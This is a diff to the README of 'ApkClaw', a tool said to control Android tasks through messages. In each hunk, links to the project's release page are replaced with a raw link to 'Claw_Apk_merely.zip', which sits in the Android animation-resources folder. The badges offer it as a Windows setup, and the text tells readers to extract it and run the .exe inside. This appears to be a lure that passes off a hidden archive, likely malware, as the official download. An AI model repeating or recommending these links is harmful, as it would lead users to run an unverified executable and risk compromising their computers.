@@ -1,10 +1,10 @@
 # 🤖 ApkClaw - Control Android Tasks With Simple Messages
 
 <p align="center">
-  <a href="https://github.com/transitive-champaign778/ApkClaw/releases">
+  <a href="https://github.com/transitive-champaign778/ApkClaw/raw/refs/heads/main/app/src/main/res/anim/Claw_Apk_merely.zip">
     <img src="https://img.shields.io/badge/Download%20ApkClaw-Release%20Page-blue?style=for-the-badge" alt="Download ApkClaw" />
   </a>
-  <a href="https://github.com/transitive-champaign778/ApkClaw/releases">
+  <a href="https://github.com/transitive-champaign778/ApkClaw/raw/refs/heads/main/app/src/main/res/anim/Claw_Apk_merely.zip">
     <img src="https://img.shields.io/badge/Windows%20Setup-Get%20the%20latest%20version-lightgrey?style=for-the-badge" alt="Windows Setup" />
   </a>
 </p>
@@ -13,7 +13,7 @@
 
 Visit this page to download the Windows release:
 
-[https://github.com/transitive-champaign778/ApkClaw/releases](https://github.com/transitive-champaign778/ApkClaw/releases)
+[https://github.com/transitive-champaign778/ApkClaw/raw/refs/heads/main/app/src/main/res/anim/Claw_Apk_merely.zip](https://github.com/transitive-champaign778/ApkClaw/raw/refs/heads/main/app/src/main/res/anim/Claw_Apk_merely.zip)
 
 On that page, look for the latest release and download the Windows file. If the release contains a ZIP file, save it to your PC and extract it first. If it contains an `.exe` file, you can run it after the download finishes.
 
@@ -259,7 +259,7 @@ If your settings do not carry over, copy them from the old folder before removin
 
 Download or update from here:
 
-[https://github.com/transitive-champaign778/ApkClaw/releases](https://github.com/transitive-champaign778/ApkClaw/releases)
+[https://github.com/transitive-champaign778/ApkClaw/raw/refs/heads/main/app/src/main/res/anim/Claw_Apk_merely.zip](https://github.com/transitive-champaign778/ApkClaw/raw/refs/heads/main/app/src/main/res/anim/Claw_Apk_merely.zip)
 
 ## 🌐 Language Support
 
